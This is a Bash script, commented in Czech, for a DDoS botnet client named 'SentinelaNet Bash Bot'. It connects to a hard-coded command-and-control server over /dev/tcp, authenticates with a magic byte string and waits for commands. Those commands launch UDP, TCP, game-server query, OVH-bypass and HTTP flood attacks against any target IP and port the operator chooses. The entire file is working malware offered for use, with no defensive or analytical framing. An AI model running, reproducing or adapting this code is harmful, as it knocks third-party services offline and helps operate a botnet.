#!/bin/bash

# ------------------------------------------------------------
# SentinelaNet Bash Bot
# ------------------------------------------------------------

# Konfigurace C2 serveru - NASTAVTE SPRÁVNOU IP!
C2_ADDRESS="45.153.34.27"  # <--- ZMĚŇTE NA IP VAŠEHO VPS
C2_PORT=1337

# Asociativní pole pro sledování útoků (PID + stop soubor)
declare -A USER_ATTACKS

# Konstanty
readonly PAYLOAD_FIVEM="\xff\xff\xff\xffgetinfo xxx\x00\x00\x00"
readonly PAYLOAD_VSE="\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00"
readonly PAYLOAD_MCPE="\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73"
readonly PAYLOAD_HEX="\x55\x55\x55\x55\x00\x00\x00\x01"
readonly HEX_VALUES=(2 4 8 16 32 64 128)
readonly PACKET_SIZES=(1024 2048)

# Získání architektury
get_architecture() {
    uname -m 2>/dev/null || echo "unknown"
}

# Generátor náhodných znaků pro OVH útoky
generate_end() {
    local length=${1:-4}
    local chars=${2:-'\n\r'}
    local result=""
    for ((i=0; i<length; i++)); do
        result+="${chars:$((RANDOM % ${#chars})):1}"
    done
    printf "%b" "$result"
}

# Builder pro OVH packety (vrací packet jako řetězec)
OVH_BUILDER() {
    local ip="$1"
    local port="$2"
    local random_part=""
    # Generuje náhodných 2048 bajtů
    for ((i=0; i<2048; i++)); do
        printf -v byte "\\x%02x" $((RANDOM % 256))
        random_part+="$byte"
    done

    local paths=('/0/0/0/0/0/0' '/0/0/0/0/0/0/' '\\0\\0\\0\\0\\0\\0' '\\0\\0\\0\\0\\0\\0\\')
    for p in "${paths[@]}"; do
        local end=$(generate_end)
        # Vrátí jeden packet (pro jednoduchost generujeme vždy jen jeden typ)
        printf "PGET %s%s HTTP/1.1\nHost: %s:%s%b" "$p" "$random_part" "$ip" "$port" "$end"
        return # Vrátí první vygenerovaný packet
    done
}

# Náhodný User-Agent
random_ua() {
    local agents=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/537.36"
    )
    echo "${agents[$RANDOM % ${#agents[@]}]}"
}

# --- Funkce pro útoky (běží na pozadí) ---

_attack_loop_udp() {
    local payload="$1"; local ip="$2"; local port="$3"; local end_time="$4"; local stop_file="$5"
    while [[ $(date +%s) -lt $end_time ]] && [[ ! -f "$stop_file" ]]; do
        echo -ne "$payload" | nc -u -w1 "$ip" "$port" 2>/dev/null
    done
    rm -f "$stop_file"
}

_attack_loop_udp_size() {
    local ip="$1"; local port="$2"; local end_time="$3"; local stop_file="$4"
    while [[ $(date +%s) -lt $end_time ]] && [[ ! -f "$stop_file" ]]; do
        local size=${PACKET_SIZES[$RANDOM % ${#PACKET_SIZES[@]}]}
        dd if=/dev/urandom bs="$size" count=1 2>/dev/null | nc -u -w1 "$ip" "$port" 2>/dev/null
    done
    rm -f "$stop_file"
}

_attack_loop_tcp_size() {
    local ip="$1"; local port="$2"; local end_time="$3"; local stop_file="$4"
    while [[ $(date +%s) -lt $end_time ]] && [[ ! -f "$stop_file" ]]; do
        local size=${PACKET_SIZES[$RANDOM % ${#PACKET_SIZES[@]}]}
        # Otevře TCP spojení, pošle data a ukončí ho
        dd if=/dev/urandom bs="$size" count=1 2>/dev/null | timeout 2 nc "$ip" "$port" 2>/dev/null
    done
    rm -f "$stop_file"
}

_attack_loop_http() {
    local request_template="$1"; local ip="$2"; local port="$3"; local end_time="$4"; local stop_file="$5"
    while [[ $(date +%s) -lt $end_time ]] && [[ ! -f "$stop_file" ]]; do
        local ua=$(random_ua)
        # Vloží User-Agent do šablony a pošle
        printf "$request_template" "$ip" "$ua" | nc "$ip" "$port" 2>/dev/null
    done
    rm -f "$stop_file"
}

_attack_loop_ovh_tcp() {
    local ip="$1"; local port="$2"; local end_time="$3"; local stop_file="$4"
    local packet=$(OVH_BUILDER "$ip" "$port")
    while [[ $(date +%s) -lt $end_time ]] && [[ ! -f "$stop_file" ]]; do
        for _ in {1..10}; do
            timeout 1 bash -c "echo -ne \"$packet\" > /dev/tcp/$ip/$port" 2>/dev/null
        done
    done
    rm -f "$stop_file"
}

_attack_loop_ovh_udp() {
    local ip="$1"; local port="$2"; local end_time="$3"; local stop_file="$4"
    local packet=$(OVH_BUILDER "$ip" "$port")
    while [[ $(date +%s) -lt $end_time ]] && [[ ! -f "$stop_file" ]]; do
        for _ in {1..10}; do
            echo -ne "$packet" | nc -u -w1 "$ip" "$port" 2>/dev/null
        done
    done
    rm -f "$stop_file"
}

# --- Spouštěč útoků ---
start_attack() {
    local method="$1"
    local ip="$2"
    local port="$3"
    local duration="$4"
    local username="$5"

    local end_time=$(( $(date +%s) + duration ))
    local stop_file="/tmp/attack_stop_${username}_${RANDOM}"
    local pid

    case "$method" in
        .UDP)
            _attack_loop_udp_size "$ip" "$port" "$end_time" "$stop_file" &
            pid=$! ;;
        .TCP)
            _attack_loop_tcp_size "$ip" "$port" "$end_time" "$stop_file" &
            pid=$! ;;
        .MIX)
            # Spustí TCP i UDP útok zároveň
            _attack_loop_tcp_size "$ip" "$port" "$end_time" "${stop_file}_tcp" &
            pid=$!
            _attack_loop_udp_size "$ip" "$port" "$end_time" "${stop_file}_udp" &
            pid="$pid $!" ;;
        .SYN)
            # SYN flood je specifický - zde jen zjednodušená verze s nc
            _attack_loop_tcp_size "$ip" "$port" "$end_time" "$stop_file" &
            pid=$! ;;
        .HEX)
            _attack_loop_udp "$PAYLOAD_HEX" "$ip" "$port" "$end_time" "$stop_file" &
            pid=$! ;;
        .VSE)
            _attack_loop_udp "$PAYLOAD_VSE" "$ip" "$port" "$end_time" "$stop_file" &
            pid=$! ;;
        .MCPE)
            _attack_loop_udp "$PAYLOAD_MCPE" "$ip" "$port" "$end_time" "$stop_file" &
            pid=$! ;;
        .FIVEM)
            _attack_loop_udp "$PAYLOAD_FIVEM" "$ip" "$port" "$end_time" "$stop_file" &
            pid=$! ;;
        .OVHUDP)
            _attack_loop_ovh_udp "$ip" "$port" "$end_time" "$stop_file" &
            pid=$! ;;
        .OVHTCP)
            _attack_loop_ovh_tcp "$ip" "$port" "$end_time" "$stop_file" &
            pid=$! ;;
        .HTTPGET)
            local req_template="GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n"
            _attack_loop_http "$req_template" "$ip" "$port" "$end_time" "$stop_file" &
            pid=$! ;;
        .HTTPPOST)
            local post_payload="username=admin&password=password123&email=admin@example.com&submit=login"
            local req_template="POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${#post_payload}\r\nConnection: keep-alive\r\n\r\n${post_payload}"
            _attack_loop_http "$req_template" "$ip" "$port" "$end_time" "$stop_file" &
            pid=$! ;;
        .BROWSER)
            local req_template="GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.5\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\nPragma: no-cache\r\n\r\n"
            _attack_loop_http "$req_template" "$ip" "$port" "$end_time" "$stop_file" &
            pid=$! ;;
        *)
            echo "Neznámý method: $method" >&2
            return 1 ;;
    esac

    # Uloží PID a stop soubor(y) pro pozdější zastavení
    USER_ATTACKS["$username"]+="$pid $stop_file "
}

# Zastavení útoků pro daného uživatele
stop_attacks() {
    local username="$1"
    if [[ -n "${USER_ATTACKS[$username]}" ]]; then
        local entries=(${USER_ATTACKS[$username]})
        for ((i=0; i<${#entries[@]}; i+=2)); do
            local pids="${entries[i]}"
            local stop_file="${entries[i+1]}"
            # Pro .MIX může být v pids více PIDů oddělených mezerou
            for pid in $pids; do
                kill "$pid" 2>/dev/null
            done
            touch "$stop_file" 2>/dev/null
            rm -f "$stop_file" 2>/dev/null
            # Odstraní i případné pomocné stop soubory (pro .MIX)
            rm -f "${stop_file}_tcp" "${stop_file}_udp" 2>/dev/null
        done
        unset USER_ATTACKS["$username"]
    fi
}

# --- Hlavní smyčka pro C2 komunikaci ---
main_loop() {
    local fd
    local line
    local cmd
    local args

    while true; do
        # Otevření TCP spojení k C2 serveru
        exec {fd}<>/dev/tcp/$C2_ADDRESS/$C2_PORT 2>/dev/null
        if [[ $? -ne 0 ]]; then
            echo "Chyba připojení k $C2_ADDRESS:$C2_PORT. Opakování za 120s..."
            sleep 120
            continue
        fi
        echo "Připojeno k C2 serveru."

        # --- Autentizace ---
        # 1. Očekává "Username"
        while true; do
            IFS= read -r -u $fd -t 10 line
            if [[ $? -ne 0 ]]; then
                echo "Timeout při čekání na 'Username'"
                exec {fd}<&-
                break 2
            fi
            line=$(echo "$line" | tr -d '\r\n')
            if [[ "$line" == *"Username"* ]]; then
                arch=$(get_architecture)
                echo "$arch" >&$fd
                break
            fi
        done

        # 2. Očekává "Password"
        while true; do
            IFS= read -r -u $fd -t 10 line
            if [[ $? -ne 0 ]]; then
                echo "Timeout při čekání na 'Password'"
                exec {fd}<&-
                break 2
            fi
            line=$(echo "$line" | tr -d '\r\n')
            if [[ "$line" == *"Password"* ]]; then
                # Odeslání speciálního řetězce: \xff\xff\xff\xff\x75
                printf "\xff\xff\xff\xff\x75" >&$fd
                break
            fi
        done

        echo "Autentizace úspěšná."

        # --- Příkazová smyčka ---
        while true; do
            IFS= read -r -u $fd -t 60 line
            if [[ $? -ne 0 ]]; then
                echo "Spojení ztraceno nebo timeout. Pokus o znovupřipojení..."
                exec {fd}<&-
                break
            fi
            line=$(echo "$line" | tr -d '\r\n')
            [[ -z "$line" ]] && continue

            args=($line)
            cmd="${args[0]}"

            case "$cmd" in
                PING)
                    echo "PONG" >&$fd
                    ;;
                STOP)
                    if [[ ${#args[@]} -ge 2 ]]; then
                        stop_attacks "${args[1]}"
                    fi
                    ;;
                .UDP|.TCP|.MIX|.SYN|.HEX|.VSE|.MCPE|.FIVEM|.OVHUDP|.OVHTCP|.HTTPGET|.HTTPPOST|.BROWSER)
                    # Formát: METHOD IP PORT DURATION [USERNAME]
                    if [[ ${#args[@]} -ge 4 ]]; then
                        local ip="${args[1]}"
                        local port="${args[2]}"
                        local duration="${args[3]}"
                        local username="${args[4]:-default}"
                        start_attack "$cmd" "$ip" "$port" "$duration" "$username"
                    fi
                    ;;
                *)
                    # Ignorovat neznámé příkazy
                    ;;
            esac
        done

        sleep 5
    done
}

# Spuštění hlavní smyčky
main_loop
